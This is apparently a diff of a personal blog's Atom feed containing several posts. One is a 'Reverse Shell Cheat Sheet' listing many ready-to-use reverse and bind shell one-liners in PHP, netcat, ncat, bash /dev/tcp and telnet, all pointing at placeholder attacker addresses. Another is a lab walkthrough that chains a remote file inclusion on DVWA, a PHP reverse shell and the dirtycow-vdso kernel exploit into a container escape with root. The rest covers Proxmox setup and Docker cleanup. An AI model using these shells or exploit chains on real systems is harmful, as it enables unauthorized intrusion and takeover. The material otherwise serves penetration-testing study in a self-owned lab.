+&lt;p&gt;Now you need to enable it in the console and tell each node they want to use the NAS for storage. Log in to your console as an admin, click data center at the top left, and the click Storage and Add and pick directory 9(mine’s added already, but here’s what you’re looking for:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/storage1.png&quot; alt=&quot;storage1&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once there, enable all types of storage, set backups to two (it will come in handy later), and save. This may report as unavailable, but once you reboot and your startup script runs, it’ll mount the drive and be ready for use.&lt;/p&gt;
+
+&lt;p&gt;Do a final reboot of your nodes. If everything went as planned, you’ve got a 2 host proxmox cluster! Congratulations.&lt;/p&gt;
+
+&lt;p&gt;Follow up posts will go into setting up PFSense and other interesting bits in the lab. Thanks for reading.&lt;/p&gt;</content><author><name></name></author><summary type="html">Proxmox is an open source virtualization solution and a really flexible base for a home lab. This guide will walk through building a simple 2 node proxmox cluster. My deployment tools are ansible and various things built into Proxmox. This guide walks through a lot of the prep work you need to do before you even install Proxmox. I recommend you follow along and get your hardware in order, plan your networking, configure your router, and then connect everything up before you start installing Proxmox.</summary></entry><entry><title type="html">Reverse Shell Cheat Sheet</title><link href="http://localhost:4000/2017/01/17/reverse-shell-cheatsheet.html" rel="alternate" type="text/html" title="Reverse Shell Cheat Sheet" /><published>2017-01-17T20:56:00-06:00</published><updated>2017-01-17T20:56:00-06:00</updated><id>http://localhost:4000/2017/01/17/reverse-shell-cheatsheet</id><content type="html" xml:base="http://localhost:4000/2017/01/17/reverse-shell-cheatsheet.html">&lt;h2 id=&quot;cause-everyone-posts-one&quot;&gt;Cause everyone posts one&lt;/h2&gt;
 
 &lt;p&gt;If enumeration is the bread and butter of penetration testing, reverse shells are the cheesecake. Stolen usernames and passwords may be one of the most reliable ways to get into a system, but theres nothing like messing something up a bunch and then finally seeing that reverse shell prompt pop up. These are some quick and easy ones in different formats.&lt;/p&gt;
 
@@ -138,9 +282,8 @@ fs.inotify.max_user_instances &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 102
 
 &lt;p&gt;If you think it should work and it’s not, tcpdump or wireshark your host (if you can) and see what’s coming and going. If I’m trying to exploit a web app on port 80 to send back a remote shell, one tcpdump quickie I use is&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump -qtpni eth0/tap0/whatever0 host &amp;lt;VICTIMIP&amp;gt; and not port 80 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump -qtpni eth0/tap0/whatever0 host &amp;lt;VICTIMIP&amp;gt; and not port 80 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;That watches traffic for anything coming back and gives you a condensed, simple output for it only on the interface you expect the attack to copme back through (tap0 if you’re on a VPN, for example), listening only for the victim host so you don’t see a bunch of other noise and excluding the port you know you’re going to see traffic on. In this case, since I’m attacking port 80, I’m probably listening on port 443 with a netcat listener. You could specify port 443 only, but this wouldn’t catch if you did something wrong in your exploit and are sending the exploit back to the wrong port (we all make mistakes).&lt;/p&gt;
 
@@ -156,21 +299,19 @@ fs.inotify.max_user_instances &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 102
 
 &lt;p&gt;This is a very generic PHP reverse shell. It runs PHP inside of itself to send a connection back with /bin/sh&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'&amp;lt;?php  echo shell_exec(php -r '$sock=fsockopen(&quot;&amp;lt;IP&amp;gt;&quot;,&amp;lt;PORT&amp;gt;);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;); ?&amp;gt;'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'&amp;lt;?php  echo shell_exec(php -r '$sock=fsockopen(&quot;&amp;lt;IP&amp;gt;&quot;,&amp;lt;PORT&amp;gt;);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;); ?&amp;gt;'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Here are a lot of variations on a theme. Each one worked for something different (some didn’t work at all, but might for you), and others are just interesting.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'&amp;lt;?php -r fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443); exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;); ?&amp;gt;'
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'&amp;lt;?php -r fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443); exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;); ?&amp;gt;'
 '&amp;lt;?php $s=fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;4 &amp;gt;&amp;amp;4 2&amp;gt;&amp;amp;4&quot;);?&amp;gt;'
 '&amp;lt;?php exec(&quot;/bin/sh | /bin/nc &amp;lt;ATTACKIP&amp;gt; 443&quot;);?&amp;gt;'
 '&amp;lt;?php $sock=fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);?&amp;gt;'
 '&amp;lt;?php set_time_limit (20);$sock=fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);?&amp;gt;'
 '&amp;lt;?php $sock=fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443);exec(&quot;/bin/sh -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ATTACKIP&amp;gt;/443 0&amp;gt;&amp;amp;1&quot;);?&amp;gt;'
 '&amp;lt;?php shell_exec(&quot;/bin/sh -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ATTACKIP&amp;gt;/443 0&amp;gt;&amp;amp;1&quot;);?&amp;gt;'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;No matter what’s different with each one, every single one is calling a command shell, sending it over a network connection to the port you want. Every example is using port 443, so adjust that as you need to adjust it. Also, note that it’s suspicious to send non-HTTPS traffic over 443, so keep that in mind if you’re dealing with deep packet inspection or an attentive analyst. It might be more useful to use meterpreter reverse_https for something like that.&lt;/p&gt;
 
@@ -180,35 +321,30 @@ fs.inotify.max_user_instances &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 102
 
 &lt;p&gt;Of course, you’ll have to work these into your exploit. To create a bind shell that only allows a specific IP to connect to it, use&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -lvp 4445 -e cmd.exe --allow &amp;lt;ATTACKIP&amp;gt; --ssl
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -lvp 4445 -e cmd.exe --allow &amp;lt;ATTACKIP&amp;gt; --ssl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;To do this even more safely, use a reverse shell&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -v &amp;lt;attackIP&amp;gt; 443 -e cmd.exe --ssl
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -v &amp;lt;attackIP&amp;gt; 443 -e cmd.exe --ssl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;non-netcat-shells&quot;&gt;Non-netcat Shells&lt;/h3&gt;
 
 &lt;p&gt;This one is really clunky, but it works when you just can’t get anything else working. For this to work, you need two listeners and your shell will show up on the second one. It’s a complete mess, but it works and it’s just kind of nifty to see.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet &amp;lt;ATTACKIP&amp;gt; 443 | /bin/sh | telnet &amp;lt;ATTACKIP&amp;gt; 444
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet &amp;lt;ATTACKIP&amp;gt; 443 | /bin/sh | telnet &amp;lt;ATTACKIP&amp;gt; 444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;This one came from &lt;a href=&quot;https://twitter.com/webpentest/status/424165659518316544&quot;&gt;this&lt;/a&gt; tweet and it’s interesting.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/bash -l &amp;gt; /dev/tcp/&amp;lt;ATTACKIP&amp;gt;/&amp;lt;ATTACKPORT&amp;gt; 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/bash -l &amp;gt; /dev/tcp/&amp;lt;ATTACKIP&amp;gt;/&amp;lt;ATTACKPORT&amp;gt; 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Another interesting telnet shell&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -f /tmp/p; mknod /tmp/p p &amp;amp;&amp;amp; telnet &amp;lt;ATTACKIP&amp;gt; &amp;lt;ATTACKPORT&amp;gt; 0/tmp/p
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -f /tmp/p; mknod /tmp/p p &amp;amp;&amp;amp; telnet &amp;lt;ATTACKIP&amp;gt; &amp;lt;ATTACKPORT&amp;gt; 0/tmp/p
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h4 id=&quot;sources&quot;&gt;Sources&lt;/h4&gt;
 
@@ -220,7 +356,7 @@ fs.inotify.max_user_instances &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 102
 
 &lt;p&gt;&lt;a href=&quot;https://highon.coffee/blog/reverse-shell-cheat-sheet/&quot;&gt;Variations&lt;/a&gt; on the theme.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&quot;&gt;Oldy&lt;/a&gt; but goody&lt;/p&gt;</content><summary type="html">Cause everyone posts one</summary></entry><entry><title type="html">Attacking Yourself First</title><link href="http://0.0.0.0:4000/2016/12/27/attacking-yourself-first.html" rel="alternate" type="text/html" title="Attacking Yourself First" /><published>2016-12-27T23:43:12-06:00</published><updated>2016-12-27T23:43:12-06:00</updated><id>http://0.0.0.0:4000/2016/12/27/attacking-yourself-first</id><content type="html" xml:base="http://0.0.0.0:4000/2016/12/27/attacking-yourself-first.html">&lt;h2 id=&quot;why-not-just-attack-someone-else&quot;&gt;Why not just attack someone else?&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&quot;&gt;Oldy&lt;/a&gt; but goody&lt;/p&gt;</content><author><name></name></author><summary type="html">Cause everyone posts one</summary></entry><entry><title type="html">Attacking Yourself First</title><link href="http://localhost:4000/2016/12/27/attacking-yourself-first.html" rel="alternate" type="text/html" title="Attacking Yourself First" /><published>2016-12-27T23:43:12-06:00</published><updated>2016-12-27T23:43:12-06:00</updated><id>http://localhost:4000/2016/12/27/attacking-yourself-first</id><content type="html" xml:base="http://localhost:4000/2016/12/27/attacking-yourself-first.html">&lt;h2 id=&quot;why-not-just-attack-someone-else&quot;&gt;Why not just attack someone else?&lt;/h2&gt;
 
 &lt;p&gt;Because it’s illegal.&lt;/p&gt;
 
@@ -234,12 +370,11 @@ fs.inotify.max_user_instances &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 102
 
 &lt;p&gt;I’m working off a different Ubuntu image than I usually work off of because I want to be sure my exploits will work (cheating, I know). If we go &lt;a href=&quot;http://releases.ubuntu.com/&quot;&gt;here&lt;/a&gt; we can find old version of Ubuntu and it even tags the date they were released. I downloaded and installed Server 14.04.5 and installed a few applications&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Install the OS, select the SSH Server as the additional functionality&amp;gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Install the OS, select the SSH Server as the additional functionality&amp;gt;
 sudo apt-get install git docker.io
 sudo usermod -aG docker $USER
 &amp;lt;reboot or log out and back in&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;That’s enough believe it or not, the rest will come with our container.&lt;/p&gt;
 
@@ -247,14 +382,13 @@ sudo usermod -aG docker $USER
 
 &lt;p&gt;You can follow the instructions in the README or do just do this:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/remotephone/dvwa-lamp.git
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/remotephone/dvwa-lamp.git
 cd dvwa-lamp
 docker build -t remotephone/dvwa-lamp .
 docker run -d -p 80:80 -p 3306:3306 remotephone/dvwa-lamp 
 &amp;lt;wait some seconds and then browse to...&amp;gt;
 http://&amp;lt;Victim IP&amp;gt;/setup.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;And you’re set! Install the database by completed the setup and login as admin/password.&lt;/p&gt;
 
@@ -268,11 +402,10 @@ http://&amp;lt;Victim IP&amp;gt;/setup.php
 
 &lt;p&gt;To make this work, you need a few things. First, get your container running. Next, get you webshells ready in your /var/www/html directory. I’m using php-reverse-shell.php from the laudunum package and I’ve updated the file to point back to my attacking server. I always use ports 443 or 80 if possible for reverse shells, firewalls tend to allow this traffic out and it’s not suspicious if someone netstats an affected server. This is the part of the webshell I modified:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$VERSION = &quot;1.0&quot;;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$VERSION = &quot;1.0&quot;;
 $ip = '192.168.1.20';  // CHANGE THIS
 $port = 443;       // CHANGE THIS
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;It’s conveniently marked with “CHANGE THIS” so you know what to update. If you want to change some of the actions under $shell, you can, especially if for some reason bash or sh is not in the /bin/ directory. Now let’s get a shell.&lt;/p&gt;
 
@@ -280,9 +413,8 @@ $port = 443;       // CHANGE THIS
 
 &lt;p&gt;First we’ll go to the File Inclusion page. At this point, my attacking machine has apache running, I’ve copied and fixed my reverse shell, hosted it in my /var/www/html folder, renamed it something short and easy to call, I’ve started a nc listener with nc -nlvp 443 and I’ve browsed to the RFI page (whew). The RFI is easy peasy here, this request in your browser will trigger it:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.1.16/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.1.16/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;It’s important to use the .txt extension since using .php will cause your own system to interpret the script and you’ll reverse shell yourself, which isn’t as exciting. In this particular page, you can View Source to see the site isn’t doing anything to append anything to your requested page, so you don’t need to use null characters to terminate the request.&lt;/p&gt;
 
@@ -290,11 +422,11 @@ $port = 443;       // CHANGE THIS
 
 &lt;p&gt;Now we’ve got a reverse shell. Now what? It’s time to enumerate. Since I borrowed this container from tutum, there was some learning I had to do. If we enumerate the kernels, we learn that we’re running a version that’s vulnerable to dirtyc0w. Since the container is simply an “isolated” sandbox on the VM, we can expect it to be running the same kernel version as the VM, and we’re right (some IPs might not match in screenshots because I’ve messed with VMs quite a bit for other stuff since I started this post, but the idea is the same):&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/kernels.png&quot; alt=&quot;Kernels&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/kernels.png&quot; alt=&quot;Kernels&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;For giggles, let’s run a Centos container and see what it’s running under the hood.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/Centosbuntu.png&quot; alt=&quot;Centosbuntu&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Centosbuntu.png&quot; alt=&quot;Centosbuntu&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;That’s interesting! There’s no difference between the kernel in the container and the one in the VM. It’d be interesting to see how important that is for packages that expect to be run in CentOS, but that’s kind of outside the scope of what I’m doing. Let’s keep moving forward.&lt;/p&gt;
 
@@ -314,41 +446,38 @@ $port = 443;       // CHANGE THIS
 
 &lt;p&gt;In the spirit of living off the land, let’s start with what got us here to begin with, php. We have rights to the system, we can move around in a shell, let’s see if we can execute arbitrary php. This isn’t pretty, but it proves my point, we can execute arbitrary php commands.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/whichesphp.png&quot; alt=&quot;Whiches and php&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/whichesphp.png&quot; alt=&quot;Whiches and php&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;So great, we can move stuff in and out, but you can see we can’t even compile anything locally once it’s on there. I checked a handful of popular containers like the CentOS one, redis, and jenkins and they all come pretty bare. These are some results from redis and jenkins:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/whichredisjenkins.png&quot; alt=&quot;Installed default packages&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/whichredisjenkins.png&quot; alt=&quot;Installed default packages&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I don’t really know a lot of ways to deal with this gracefully. If you don’t have anything on the system and you can’t or don’t want to install additional packages, the only option I know is compiling it elsewhere and bringing it to the server. Let’s find somewhere we can write to, then we’ll use php to bring in our exploit. We need somewhere we can write to, and /tmp is often available. The same is the case here:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ls -asl /tmp
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ls -asl /tmp
 total 8
 4 drwxrwxrwt  2 root root 4096 Jan 12 03:21 .
 4 drwxr-xr-x 54 root root 4096 Jan 12 03:21 ..
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;compiling-your-exploit&quot;&gt;Compiling your exploit.&lt;/h3&gt;
 
 &lt;p&gt;We already know the kernel version, 4.4.0-31 and we don’t have an image laying around with that particular version, but we do have an updated image in an VM we have sitting around. To install the appropriate kernel, we need to find it. Search &amp;lt;distroname&amp;gt; &amp;lt;kernelversion&amp;gt; in google and you’ll hopefully find something like &lt;a href=&quot;http://packages.ubuntu.com/xenial/amd64/linux-image-4.4.0-31-generic/download&quot;&gt;this page&lt;/a&gt; where you can download and install the kernel with:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dpkg -i linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dpkg -i linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;You might also need the image-extra or headers package. Reboot into your new kernel, make sure you have the appropriate packages installed, then compile it. If you don’t have everything installed, this is the full process:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install git nasm make gcc
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install git nasm make gcc
 git clone https://github.com/scumjr/dirtycow-vdso.git
 cd dirtycow-vdso
 make
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Now move the file off your test system, on to your attacking host and into your /var/www/html folder. From here, you should be able to get into /tmp, pull the file into your victim host, change permissions, run the exploit, and get your shell. Since you’re sending a shell back to your container from the host, you need to make sure you send it to the proper IP. By default, the exploit uses 127.0.0.1, which will not work. You only get one chance with this exploit if it goes wrong, so make sure you send it to the docker eth0 and you’ll get your shell back as root inside the host!&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/fullescape.png&quot; alt=&quot;Full Escape&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/fullescape.png&quot; alt=&quot;Full Escape&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;And there you go, you’ve successfully gone from a web application, to a container shell, to a full host escape and root! Sobering stuff.&lt;/p&gt;
 
@@ -356,7 +485,7 @@ make
 
 &lt;p&gt;Containers are not a panacea. They won’t mean you’re 100% secure, but they do put some difficult restrictions around attackers. Unless they haven’t gotten around to patching dirtyc0w (which wouldn’t be &lt;em&gt;that&lt;/em&gt; surprising), you better be sitting on some creative ways of interacting with the kernel if you want to escape a container. As people get better with containers, best practices get better defined, and things like &lt;a href=&quot;https://clearlinux.org/&quot;&gt;Clear Linux&lt;/a&gt; really take off, I think it’s only going to get more interesting for attackers and pen testers.&lt;/p&gt;
 
-&lt;p&gt;Thanks!&lt;/p&gt;</content><summary type="html">Why not just attack someone else?</summary></entry><entry><title type="html">Practical Docker for Security Admins - Part 2</title><link href="http://0.0.0.0:4000/lab/homelab/budget/testing/2016/12/26/practical-docker-part2.html" rel="alternate" type="text/html" title="Practical Docker for Security Admins - Part 2" /><published>2016-12-26T22:15:33-06:00</published><updated>2016-12-26T22:15:33-06:00</updated><id>http://0.0.0.0:4000/lab/homelab/budget/testing/2016/12/26/practical-docker-part2</id><content type="html" xml:base="http://0.0.0.0:4000/lab/homelab/budget/testing/2016/12/26/practical-docker-part2.html">&lt;h2 id=&quot;more-test-cases-but-first-some-housekeeping&quot;&gt;More test cases, but first, some housekeeping&lt;/h2&gt;
+&lt;p&gt;Thanks!&lt;/p&gt;</content><author><name></name></author><summary type="html">Why not just attack someone else?</summary></entry><entry><title type="html">Practical Docker for Security Admins - Part 2</title><link href="http://localhost:4000/lab/homelab/budget/testing/2016/12/26/practical-docker-part2.html" rel="alternate" type="text/html" title="Practical Docker for Security Admins - Part 2" /><published>2016-12-26T22:15:33-06:00</published><updated>2016-12-26T22:15:33-06:00</updated><id>http://localhost:4000/lab/homelab/budget/testing/2016/12/26/practical-docker-part2</id><content type="html" xml:base="http://localhost:4000/lab/homelab/budget/testing/2016/12/26/practical-docker-part2.html">&lt;h2 id=&quot;more-test-cases-but-first-some-housekeeping&quot;&gt;More test cases, but first, some housekeeping&lt;/h2&gt;
 
 &lt;p&gt;Docker will fill up disk space quickly if you’re not managing it actively or planning for it. Since I use throw away VMs for my docker containers, I don’t give them a lot of disk space to fill up. When your splunking through large indexes of data, you can very quickly fill up a virtual disk. There’s a few ways I’ve found to manage the data.&lt;/p&gt;
 
@@ -366,23 +495,22 @@ make
 
 &lt;p&gt;Let’s see what docker ps and some related commands show us:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/dockerps.png&quot; alt=&quot;docker ps&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/dockerps.png&quot; alt=&quot;docker ps&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok, nothing too crazy. The first command was verbose, showing us all the container data, like ports forwarded, the name, etc etc. The next one was just a quick oneliner of the container ID. Then we killed that container and started up a new one. If we look at running containers again, we only see a single container. The next command is where stuff get’s interesting, because docker ps -qa shows us 2 containers, one of which matches the terminated container! It didn’t clean up after us, so we need to do that ourselves.&lt;/p&gt;
 
 &lt;p&gt;Speaking of didn’t clean up after us, remember that container we built? If you watched the build process, you’ll remember it spun up some intermediate containers. Let’s see if they left anything behind. I saved myself some trouble here by piping it to xargs and cleaning up at once.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/dockerdanglers.png&quot; alt=&quot;docker danglers&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/dockerdanglers.png&quot; alt=&quot;docker danglers&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok wow, so that’s quite a few volumes we cleaned up. These were the residual images from the intermediate containers that were built. None of this stuff goes away on it’s own, so just keep an eye on your disk space as you’re building and throwing things away, it will catch up to you eventually.&lt;/p&gt;
 
 &lt;p&gt;Here’s what I run to completely clean up, courtsey of &lt;a href=&quot;http://blog.yohanliyanage.com/2015/05/docker-clean-up-after-yourself/&quot;&gt;this site&lt;/a&gt; and &lt;a href=&quot;https://lebkowski.name/docker-volumes/&quot;&gt;this one&lt;/a&gt; and some tinkering:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker stop $(docker ps -a -q)
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker stop $(docker ps -a -q)
 docker rm $(docker ps -a -q)
 docker volume ls -qf dangling=true | xargs -r docker volume rm
